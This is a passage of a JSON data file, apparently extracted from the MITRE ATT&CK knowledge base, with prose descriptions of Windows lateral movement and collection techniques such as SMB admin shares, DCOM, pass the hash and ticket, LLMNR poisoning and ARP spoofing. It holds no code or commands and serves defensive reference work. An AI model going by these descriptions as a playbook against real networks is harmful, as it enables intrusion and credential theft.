    "description": "Adversaries may useValid Accountsto interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares includeC$,ADMIN$, andIPC$. Adversaries may use this technique in conjunction with administrator-levelValid Accountsto remotely access a networked system over SMB,[1]to interact with systems using remote procedure calls (RPCs),[2]transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC areScheduled Task/Job,Service Execution, andWindows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems withPass the Hashand certain configuration and patch levels.[3]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Services",
    "parent_technique_id": "T1021",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:09.567424"
  },
  {
    "technique_id": "T1021.003",
    "name": "Distributed Component Object Model",
    "description": "Adversaries may useValid Accountsto interact with remote machines by taking advantage of Distributed Component Object Model (DCOM). The adversary may then perform actions as the logged-on user.The Windows Component Object Model (COM) is a component of the native Windows application programming interface (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is transparent middleware that extends the functionality of COM beyond a local computer using remote procedure call (RPC) technology.[1][2]Permissions to interact with local and remote server COM objects are specified by access control lists (ACL) in the Registry.[3]By default, only Administrators may remotely activate and launch COM objects through DCOM.[4]Through DCOM, adversaries operating in the context of an appropriately privileged user can remotely obtain arbitrary and even direct shellcode execution through Office applications[5]as well as other Windows objects that contain insecure methods.[6][7]DCOM can also execute macros in existing documents[8]and may also invokeDynamic Data Exchange(DDE) execution directly through a COM created instance of a Microsoft Office application[9], bypassing the need for a malicious document. DCOM can be used as a method of remotely interacting withWindows Management Instrumentation.[10]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Services",
    "parent_technique_id": "T1021",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:12.931641"
  },
  {
    "technique_id": "T1021.005",
    "name": "VNC",
    "description": "Adversaries may useValid Accountsto remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (\"remote framebuffer\") protocol to enable users to remotely control another computerâ€™s display by relaying the screen, mouse, and keyboard inputs over the network.[1]VNC differs fromRemote Desktop Protocolas VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.[2][3]Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.[4][5][6][7][8][9]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Services",
    "parent_technique_id": "T1021",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:16.286371"
  },
  {
    "technique_id": "T1021.006",
    "name": "Windows Remote Management",
    "description": "Adversaries may useValid Accountsto interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).[1]It may be called with thewinrmcommand or by any number of programs such as PowerShell.[2]WinRM  can be used as a method of remotely interacting withWindows Management Instrumentation.[3]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Remote Services",
    "parent_technique_id": "T1021",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:19.642020"
  },
  {
    "technique_id": "T1091",
    "name": "Replication Through Removable Media",
    "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB.[1]This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.[2][3]For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:23.005569",
    "subtechniques": []
  },
  {
    "technique_id": "T1072",
    "name": "Software Deployment Tools",
    "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.Access to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.SaaS-based configuration management services may allow for broadCloud Administration Commandon cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.[1]Such services may also utilizeWeb Protocolsto communicate back to adversary owned infrastructure.[2]Network infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.[3]The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:26.348169",
    "subtechniques": []
  },
  {
    "technique_id": "T1080",
    "name": "Taint Shared Content",
    "description": "Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It usesShortcut Modificationof directory .LNK files that useMasqueradingto look like the real directories, which are hidden throughHidden Files and Directories. The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts.[1]Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:29.705775",
    "subtechniques": []
  },
  {
    "technique_id": "T1550",
    "name": "Use Alternate Authentication Material",
    "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.[1][2]Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the systemâ€”either in memory or on diskâ€”it may be at risk of being stolen throughCredential Accesstechniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:33.040296",
    "subtechniques": [
      {
        "id": "T1550.002",
        "name": "Pass the Hash"
      },
      {
        "id": "T1550.003",
        "name": "Pass the Ticket"
      }
    ]
  },
  {
    "technique_id": "T1550.002",
    "name": "Pass the Hash",
    "description": "Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.When performing PtH, valid password hashes for the account being used are captured using aCredential Accesstechnique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.Adversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to performPass the Ticketattacks.[1]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Use Alternate Authentication Material",
    "parent_technique_id": "T1550",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:36.318449"
  },
  {
    "technique_id": "T1550.003",
    "name": "Pass the Ticket",
    "description": "Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.When preforming PtT, valid Kerberos tickets forValid Accountsare captured byOS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.[1][2]ASilver Ticketcan be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).[1]AGolden Ticketcan be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.[3]Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e.Pass the Hash) while also using the password hash to create a valid Kerberos ticket.[4]",
    "tactic": "Lateral Movement",
    "tactics": [
      "Lateral Movement"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Use Alternate Authentication Material",
    "parent_technique_id": "T1550",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:39.577807"
  },
  {
    "technique_id": "T1557",
    "name": "Adversary-in-the-Middle",
    "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such asNetwork Sniffing,Transmitted Data Manipulation, or replay attacks (Exploitation for Credential Access). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.[1]For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.[2][3][4]Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens (Steal Application Access Token) and session cookies (Steal Web Session Cookie).[5][6]Downgrade Attacks can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.[7][8][9]Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as inTransmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially toImpair Defensesand/or in support of aNetwork Denial of Service.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:42.850792",
    "subtechniques": [
      {
        "id": "T1557.001",
        "name": "LLMNR/NBT-NS Poisoning and SMB Relay"
      },
      {
        "id": "T1557.002",
        "name": "ARP Cache Poisoning"
      },
      {
        "id": "T1557.003",
        "name": "DHCP Spoofing"
      }
    ]
  },
  {
    "technique_id": "T1557.001",
    "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials.Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.[1][2]Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or throughNetwork Sniffingand crack the hashes offline throughBrute Forceto obtain the plaintext passwords.In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.[3][4]Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, andResponder.[5][6][7]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Adversary-in-the-Middle",
    "parent_technique_id": "T1557",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:46.186090"
  },
  {
    "technique_id": "T1557.002",
    "name": "ARP Cache Poisoning",
    "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such asNetwork SniffingorTransmitted Data Manipulation.The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.[1]Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.[2][3]Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.[2]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Adversary-in-the-Middle",
    "parent_technique_id": "T1557",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:49.518259"
  },
  {
    "technique_id": "T1557.003",
    "name": "DHCP Spoofing",
    "description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such asNetwork SniffingorTransmitted Data Manipulation.DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients.[1]The typical server-client interaction is as follows:The client broadcasts aDISCOVERmessage.The server responds with anOFFERmessage, which includes an available network address.The client broadcasts aREQUESTmessage, which includes the network address offered.The server acknowledges with anACKmessage and the client receives the network configuration parameters.Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers.[2][3]Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.DHCPv6 clients can receive network configuration information without being assigned an IP address by sending aINFORMATION-REQUEST (code 11)message to theAll_DHCP_Relay_Agents_and_Serversmulticast address.[4]Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e,Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a networkâ€™s DHCP allocation pool.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Adversary-in-the-Middle",
    "parent_technique_id": "T1557",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:52.874876"
  },
  {
    "technique_id": "T1560",
    "name": "Archive Collected Data",
    "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.[1]Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:56.228291",
    "subtechniques": [
      {
        "id": "T1560.001",
        "name": "Archive via Utility"
      },
      {
        "id": "T1560.002",
        "name": "Archive via Library"
      },
      {
        "id": "T1560.003",
        "name": "Archive via Custom Method"
      }
    ]
  },
  {
    "technique_id": "T1560.001",
    "name": "Archive via Utility",
    "description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such astaron Linux and macOS orzipon Windows systems.On Windows,diantzormakecabmay be used to package collected files into a cabinet (.cab) file.diantzmay also be used to download and compress files from remote locations (i.e.Remote Data Staging).[1]xcopyon Windows can copy files and directories with a variety of options. Additionally, adversaries may usecertutilto Base64 encode collected data before exfiltration.Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.[2][3][4]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Archive Collected Data",
    "parent_technique_id": "T1560",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:20:59.630863"
  },
  {
    "technique_id": "T1560.002",
    "name": "Archive via Library",
    "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, includingPythonrarfile[1], libzip[2], and zlib[3]. Most libraries include functionality to encrypt and/or compress data.Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Archive Collected Data",
    "parent_technique_id": "T1560",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:02.981333"
  },
  {
    "technique_id": "T1560.003",
    "name": "Archive via Custom Method",
    "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.[1]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Archive Collected Data",
    "parent_technique_id": "T1560",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:06.402431"
  },
  {
    "technique_id": "T1123",
    "name": "Audio Capture",
    "description": "An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.[1]Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:09.733061",
    "subtechniques": []
  },
  {
    "technique_id": "T1119",
    "name": "Automated Collection",
    "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of aCommand and Scripting Interpreterto search for and copy information fitting set criteria such as file type, location, or name at specific time intervals.In cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.[1]This functionality could also be built into remote access tools.This technique may incorporate use of other techniques such asFile and Directory DiscoveryandLateral Tool Transferto identify and move files, as well asCloud Service DashboardandCloud Storage Object Discoveryto identify resources in cloud environments.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:13.095972",
    "subtechniques": []
  },
  {
    "technique_id": "T1185",
    "name": "Browser Session Hijacking",
    "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.[1]A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.[2][3]Executing browser-based behaviors such as pivoting may require specific process permissions, such asSeDebugPrivilegeand/or high-integrity/administrator rights.Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such asSharepointor webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.[4]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:16.412934",
    "subtechniques": []
  },
  {
    "technique_id": "T1115",
    "name": "Clipboard Data",
    "description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications.For example, on Windows adversaries can access clipboard data by usingclip.exeorGet-Clipboard.[1][2][3]Additionally, adversaries may monitor then replace usersâ€™ clipboard with their data (e.g.,Transmitted Data Manipulation).[4]macOS and Linux also have commands, such aspbpaste, to grab clipboard contents.[5]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:19.766114",
    "subtechniques": []
  },
  {
    "technique_id": "T1213",
    "name": "Data from Information Repositories",
    "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e.,Transfer Data to Cloud Account).The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentials (i.e.,Unsecured Credentials)Work / project schedulesSource code snippetsLinks to network shares and other internal resourcesContact or other sensitive information about business partners and customers, including personally identifiable information (PII)Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databasesCollaboration platforms such as SharePoint, Confluence, and code repositoriesMessaging platforms such as Slack and Microsoft TeamsIn some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.[1][2][3]",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:23.014166",
    "subtechniques": [
      {
        "id": "T1213.002",
        "name": "Sharepoint"
      }
    ]
  },
  {
    "technique_id": "T1213.002",
    "name": "Sharepoint",
    "description": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:Policies, procedures, and standardsPhysical / logical network diagramsSystem architecture diagramsTechnical system documentationTesting / development credentials (i.e.,Unsecured Credentials)Work / project schedulesSource code snippetsLinks to network shares and other internal resources",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Data from Information Repositories",
    "parent_technique_id": "T1213",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:26.338738"
  },
  {
    "technique_id": "T1005",
    "name": "Data from Local System",
    "description": "Adversaries may search local system sources, such as file systems, configuration files, local databases, or virtual machine files, to find files of interest and sensitive data prior to Exfiltration.Adversaries may do this using aCommand and Scripting Interpreter, such ascmdas well as aNetwork Device CLI, which have functionality to interact with the file system to gather information.[1]Adversaries may also useAutomated Collectionon the local system.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:29.838786",
    "subtechniques": []
  },
  {
    "technique_id": "T1039",
    "name": "Data from Network Shared Drive",
    "description": "Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality withincmdmay be used to gather information.",
    "tactic": "Collection",
    "tactics": [
      "Collection"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:21:33.197648",
    "subtechniques": []
  },
  {
    "technique_id": "T1025",
    "name": "Data from Removable Media",
